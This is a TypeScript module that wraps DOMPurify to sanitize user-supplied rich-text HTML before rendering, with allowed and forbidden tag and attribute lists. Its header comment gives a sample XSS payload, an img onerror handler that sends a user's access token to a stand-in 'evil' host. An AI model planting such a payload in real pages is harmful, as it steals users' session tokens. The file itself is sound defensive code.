/**
 * sanitizeHtml — the ONLY approved way to feed user-supplied HTML into a
 * dangerouslySetInnerHTML sink.
 *
 * Rich-text fields (assignment description/instructions, teacher
 * qualifications, etc.) are entered by users and rendered as HTML. Without
 * sanitising, a payload like
 *   <img src=x onerror="fetch('//evil/'+localStorage.accessToken)">
 * would execute in a viewer's browser and exfiltrate their token. DOMPurify
 * strips scripts, event handlers, and dangerous URLs while keeping the safe
 * formatting tags our editor produces.
 */
import createDOMPurify from 'dompurify';

// DOMPurify needs a DOM `window`. In the browser it auto-binds; under
// jsdom/Node (tests) or SSR we bind explicitly so `.sanitize` is callable.
const purifier: any = (() => {
  const w = typeof window !== 'undefined' ? window : undefined;
  const dp: any = w ? (createDOMPurify as any)(w) : (createDOMPurify as any);
  // If we still don't have a working sanitize (no DOM at all), fall back to a
  // strip-tags implementation so the app never renders raw HTML.
  if (typeof dp?.sanitize === 'function') return dp;
  return {
    sanitize: (s: string) => String(s).replace(/<[^>]*>/g, ''),
  };
})();

// Allow the formatting our rich-text output uses; forbid anything scriptable.
const CONFIG: any = {
  ALLOWED_TAGS: [
    'p', 'br', 'b', 'strong', 'i', 'em', 'u', 's', 'span', 'div',
    'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'a', 'hr', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],
  ALLOWED_ATTR: ['href', 'title', 'target', 'rel', 'class'],
  // Block javascript:/data: URIs on links.
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style'],
};

/** Return a sanitized HTML string safe to pass to dangerouslySetInnerHTML. */
export function sanitizeHtml(dirty: string | null | undefined): string {
  if (!dirty) return '';
  return purifier.sanitize(dirty, CONFIG) as unknown as string;
}

/** Convenience for JSX: sanitizeMarkup(x) → { __html } for dangerouslySetInnerHTML. */
export function sanitizeMarkup(dirty: string | null | undefined): { __html: string } {
  return { __html: sanitizeHtml(dirty) };
}
